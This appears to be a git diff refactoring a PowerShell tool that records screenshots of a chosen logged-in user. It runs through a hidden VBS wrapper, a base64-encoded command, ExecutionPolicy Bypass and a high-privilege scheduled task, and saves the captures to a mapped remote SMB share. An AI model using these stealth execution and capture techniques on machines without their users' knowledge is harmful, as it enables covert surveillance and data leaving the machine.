@@ -1,7 +1,72 @@
 
 
-$Script = @"
 
+function Invoke-MapRemoteDrive {
+    [CmdletBinding(SupportsShouldProcess)]
+    param()
+
+
+    $NetExe = (Get-Command "net.exe").Source
+    $Credz = Get-AppCredentials -Id "mini.samba.shares"
+    $SmbUser = $Credz.UserName
+    $SmbPasswd = $Credz.GetNetworkCredential().Password
+    $UserOpt = '/USER:{0}' -f $SmbUser
+    $PersistOpt = "/persistent:yes"
+
+    $letter = "k:"
+    $path = "\\10.0.0.138\RemoteScreenShots"
+    & "$NetExe" "use" "$letter" "$path" "$PersistOpt" "$UserOpt" "$SmbPasswd"
+
+    if ($? -eq $True) {
+        Write-Host "Great!" -f Darkgreen
+
+    } else {
+        Write-Host "error" -f DarkRed
+    }
+}
+
+
+function Invoke-StartRecord {
+    [CmdletBinding(SupportsShouldProcess)]
+    param(
+        [Parameter(Mandatory = $false)]
+        [ValidateRange(5, 120)]
+        [int]$Minutes = 10,
+        [Parameter(Mandatory = $false)]
+        [ValidateRange(5, 120)]
+        [int]$Delay = 30
+    )
+    try {
+        $UseVbs = $True
+
+
+
+        $ScriptStartRecord = @"
+
+function Invoke-MapRemoteDrive {{
+    [CmdletBinding(SupportsShouldProcess)]
+    param()
+
+
+    `$NetExe = (Get-Command `"net.exe`").Source
+    `$Credz = Get-AppCredentials -Id `"mini.samba.shares`"
+    `$SmbUser = `$Credz.UserName
+    `$SmbPasswd = `$Credz.GetNetworkCredential().Password
+    `$UserOpt = '/USER:{0}' -f `$SmbUser
+    `$PersistOpt = `"/persistent:yes`"
+
+    `$letter = `"k:`"
+    `$path = `"\\10.0.0.138\RemoteScreenShots`"
+    & `"`$NetExe`" `"use`" `"`$letter`" `"`$path`" `"`$PersistOpt`" `"`$UserOpt`" `"`$SmbPasswd`"
+
+    if (`$? -eq `$True) {{
+        Write-Host `"Great!`" -f Darkgreen
+
+    }} else {{
+        Write-Host `"error`" -f DarkRed
+    }}
+}}
+Invoke-MapRemoteDrive
 
 function Add-TaskLog{{
     [CmdletBinding()]
@@ -82,47 +147,10 @@ Start-SaveScreenshots -Minutes {0} -Delay {1}
 "@
 
 
-function Invoke-MapRemoteDrive {
-    [CmdletBinding(SupportsShouldProcess)]
-    param()
-
-
-       $NetExe = (Get-Command "net.exe").Source
-        $Credz = Get-AppCredentials -Id "mini.samba.shares"
-        $SmbUser = $Credz.UserName
-        $SmbPasswd = $Credz.GetNetworkCredential().Password
-        $UserOpt = '/USER:{0}' -f $SmbUser
-        $PersistOpt = "/persistent:yes"
-
-        $letter = "k:"
-        $path = "\\10.0.0.138\RemoteScreenShots"
-        &"$NetExe" "use" "$letter" "$path" "$PersistOpt" "$UserOpt" "$SmbPasswd"
-
-        if($? -eq $True){
-            Write-Host "Great!" -f Darkgreen
-
-        }else{
-            Write-Host "error" -f DarkRed
-        }
-}
-
-function Invoke-StartRecord {
-    [CmdletBinding(SupportsShouldProcess)]
-    param(
-        [Parameter(Mandatory = $false)]
-        [ValidateRange(5, 120)]
-        [int]$Minutes = 10,
-        [Parameter(Mandatory = $false)]
-        [ValidateRange(5, 120)]
-        [int]$Delay = 30
-    )
-    try {
-        $UseVbs = $True
-
-        [string]$ScriptString = $Script -f $Minutes, $Delay
+        [string]$ScriptString = $ScriptStartRecord -f $Minutes, $Delay
 
         [string]$ScriptBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptString))
-$now = [datetime]::Now.AddSeconds(30)
+        $now = [datetime]::Now.AddSeconds($Delay)
         # Example Usage
         $selectedUser = Select-LoggedInUser
         Write-Host "You selected: $selectedUser"
@@ -137,42 +165,52 @@ $now = [datetime]::Now.AddSeconds(30)
             Write-Host "Failed" -f DarkRed
         }
 
-[string]$VBSFile = "$env:TEMP\hidden_powershell.vbs"
+        [string]$VBSFile = "$env:TEMP\hidden_powershell.vbs"
         [string]$VBSContent = @"
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64", 0, False
 "@
 
-[string]$ArgumentString = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {0}" -f $ScriptBase64
+        [string]$ArgumentString = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {0}" -f $ScriptBase64
         Write-host "Create Scheduled Task with Base64 Encoded Command"
-       
 
-$VBSContent | Set-Content -Path $VBSFile -Encoding ASCII
-[int]$rc=15
-            Write-Host "Create a Scheduled Task to Run the VBS Script"
-            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument `"$VBSFile`"
 
-         #$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64"
+        $VBSContent | Set-Content -Path $VBSFile -Encoding ASCII
+        [int]$rc = 15
+        Write-Host "Create a Scheduled Task to Run the VBS Script"
+        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument `"$VBSFile`"
 
-        
+        #$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64"
+
+
         $ts = New-TimeSpan -Minutes 1
 
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount $rc -RestartInterval $ts -MultipleInstances IgnoreNew
-        $Trigger = New-ScheduledTaskTrigger  -At $now -Once:$false
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
+        $Trigger = New-ScheduledTaskTrigger -At $now -Once:$false
         $Principal = New-ScheduledTaskPrincipal -UserId "$selectedUser" -LogonType Interactive -RunLevel Highest
-        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings 
+        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
 
         write-host "Register and Run Task"
         Register-ScheduledTask -TaskName $TaskName -InputObject $Task | Out-Null
         Start-ScheduledTask -TaskName $TaskName
 
         Write-Host "In 10 seconds... $ENV:Temp\task_record.log"
-        
+
     } catch {
         write-error "$_"
     }
 
 }
+
+function Read-RecordLogFile {
+    [CmdletBinding(SupportsShouldProcess)]
+    param()
+
+    $LogFile = "$ENV:Temp\task_record.log"
+    get-content "$LogFile" | Select -Last 10
+
+}
+
 
 function Invoke-StopRecord {
     [CmdletBinding(SupportsShouldProcess)]
@@ -186,7 +224,7 @@ function Invoke-StopRecord {
     )
     try {
         [string]$TaskName = "ScreenshotsDelayedRemote"
-        [int]$NumPowershell = (tasklist | Select-String "powershell" -Raw  | measure ).Count
+        [int]$NumPowershell = (tasklist | Select-String "powershell" -Raw | measure).Count
         try {
             Stop-ScheduledTask -TaskName $TaskName -ErrorAction Stop
             Write-Host "Unregister task $TaskName" -NoNewline -f DarkYellow
@@ -195,10 +233,10 @@ function Invoke-StopRecord {
         } catch {
             Write-Host "Failed" -f DarkRed
         }
-        [string[]]$Res = &"C:\Windows\system32\taskkill.exe" "/IM" "powershell.exe" "/F" 2> "$ENV:Temp\killres.txt"
+        [string[]]$Res = & "C:\Windows\system32\taskkill.exe" "/IM" "powershell.exe" "/F" 2> "$ENV:Temp\killres.txt"
         $Killed = $Res.Count
         Write-Host "NumPowershell $NumPowershell Killed $Killed"
-        
+
     } catch {
         write-error "$_"
     }
